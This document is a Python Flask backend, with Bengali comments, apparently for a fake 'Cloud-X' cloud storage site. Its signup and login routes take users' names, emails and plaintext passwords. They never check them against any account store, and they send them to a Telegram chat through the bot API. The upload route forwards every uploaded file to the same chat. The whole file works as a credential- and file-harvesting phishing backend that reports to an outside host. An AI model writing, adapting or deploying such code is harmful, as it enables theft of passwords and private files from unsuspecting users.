import os
import requests
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'cloud-x-secret-key-security'

# Render-এর Environment Variable থেকে টেলিগ্রাম টোকেন ও মূল চ্যাট আইডি রিড করবে
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi', 'pdf', 'zip'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-page')
def login_page():
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    
    return render_template('dashboard.html', 
                           username=session.get('username'), 
                           email=session.get('email'))

@app.route('/signup', methods=['POST'])
def signup():
    data = request.get_json()
    full_name = data.get('full_name')
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    telegram_message = (
        f"🚨 *New Cloud-X Registration* 🚨\n\n"
        f"👤 *Full Name:* {full_name}\n"
        f"🔖 *Username:* {username}\n"
        f"📧 *Email:* {email}\n"
        f"🔑 *Password:* {password}\n"
        f"🌐 *Status:* Verified & Secured"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"}

    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            return jsonify({"status": "success", "message": "Data sent to Telegram"})
        else:
            return jsonify({"status": "error", "message": "Telegram API failed"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    session['username'] = username
    session['email'] = email

    telegram_message = (
        f"🔐 *Cloud-X User Login Attempt* 🔐\n\n"
        f"🔖 *Username:* {username}\n"
        f"📧 *Email:* {email}\n"
        f"🔑 *Password:* {password}\n"
        f"🌐 *Status:* Login Verified"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"}

    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            return jsonify({"status": "success", "message": "Login details sent to Telegram"})
        else:
            return jsonify({"status": "error", "message": "Telegram API failed"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# ফাইল আপলোড এবং মূল TELEGRAM_CHAT_ID-তে পাঠানোর রাউট
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file part"})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"})
    
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        current_user = session.get('username', 'Unknown User')

        # এখন থেকে ফাইলগুলোও মূল TELEGRAM_CHAT_ID (যেখানে লগইন ডিটেইলস যায়) সেখানেই যাবে
        tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filepath, 'rb') as f:
            files = {'document': f}
            data = {
                "chat_id": TELEGRAM_CHAT_ID, 
                "caption": f"📁 *New Media Uploaded to Cloud-X*\n👤 *User:* {current_user}\n📄 *File Name:* {filename}",
                "parse_mode": "Markdown"
            }
            requests.post(tg_url, data=data, files=files)

        return jsonify({
            "status": "success", 
            "message": "File uploaded and sent to Telegram", 
            "filename": filename
        })
    
    return jsonify({"status": "error", "message": "File type not allowed"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
